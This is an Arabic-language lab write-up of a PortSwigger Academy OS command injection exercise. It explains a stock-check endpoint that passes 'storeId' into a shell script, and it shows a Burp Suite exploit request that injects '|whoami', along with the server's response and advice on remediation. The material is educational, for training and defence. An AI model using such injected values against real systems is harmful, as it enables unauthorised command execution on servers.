# Lab 01 — OS Command Injection, Simple Case (الحالة البسيطة الظاهرة)

[![التصنيف](https://img.shields.io/badge/الفئة-OS%20Command%20Injection-red)]()
[![النوع](https://img.shields.io/badge/النوع-OS%20Command%20Injection%20(In-band%20/%20Verbose)-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-منخفض%20(Low)%20/%20تمهيدي-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/os-command-injection)

> هذا الشرح جزء من سلسلة [معامل حقن أوامر النظام (OS Command Injection)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 01 — OS Command Injection, Simple Case (الحالة البسيطة الظاهرة) |
| **تصنيف الثغرة** | OS Command Injection (In-band / Verbose) |
| **معيار الضعف (CWE)** | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| **مستوى الخطورة** | منخفض (Low) / تمهيدي |
| **الهدف من اللاب** | تنفيذ أمر whoami لمعرفة اسم مستخدم النظام وعرض ناتجه في المتصفح. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

يقوم متجر الويب بوظيفة فحص توفر كمية المخزون (Check Stock) لمنتج معين في فرع متجر محدد. عندما يضغط المستخدم زر الفحص، يرسل المتصفح طلباً:
`POST /product/stock` مع بيانات `productId=1&storeId=1`.

**الخلل الفكري هنا:** في الباك إند، بدلاً من أن يستعلم المطور عن المخزون من الداتابيز، قام باستدعاء سكربت قديم على السيرفر عبر الشل:
`stock.sh <productId> <storeId>`.
يقوم المطور بدمج قيمة `storeId` نصياً دون فحص. إذا وضع المهاجم الفاصل `|` (Pipe) متبوعاً بأمر `whoami`، يقوم مفسر الشل بتمرير ناتج سكربت المخزون إلى أمر `whoami` ثم طباعة ناتجه في رد الـ HTTP مباشرة!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يحقن الرمز `|` لقطع أمر المخزون وتنفيذ أمر `whoami` وعرض اسمه في الاستجابة المباشرة.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
المطور استدعى سكربت شل خارجي من الباك إند ودمج مدخل المستخدم فيه مباشرة بدلاً من استخدام استعلام برمجي آمن.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. تصفح أي منتج في المتجر واضغط على زر **Check stock**.
2. التقط طلب `POST /product/stock` في Burp Suite وأرسله إلى **Repeater**.
3. عدل جسم الطلب في باراميتر `storeId` ليكون كالتالي:
`productId=1&storeId=1|whoami`.
4. اضغط Send: ستلاحظ أن السيرفر أعاد استجابة `200 OK` وفي جسم الاستجابة ظهر اسم مستخدم السيرفر (مثال: `peter-123456`) بدلاً من رقم المخزون!
5. يحل اللاب تلقائياً بمجرد ظهور اسم المستخدم في الاستجابة.

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
POST /product/stock HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

productId=1&storeId=1|whoami
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 200 OK
Content-Type: text/plain

peter-q8k4x1
```

---

## 6. الأثر الواقعي للثغرة (Impact)

تنفيذ أوامر عشوائية صريحة على نظام التشغيل وقراءة ملفات ومجلدات السيرفر.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

عدم استدعاء سكربتات الشل إطلاقاً، واستبدالها بدوال برمجية تقرأ المخزون من قاعدة البيانات عبر استعلامات مُعاملة (Parameterized Queries).

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP Top 10 — A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
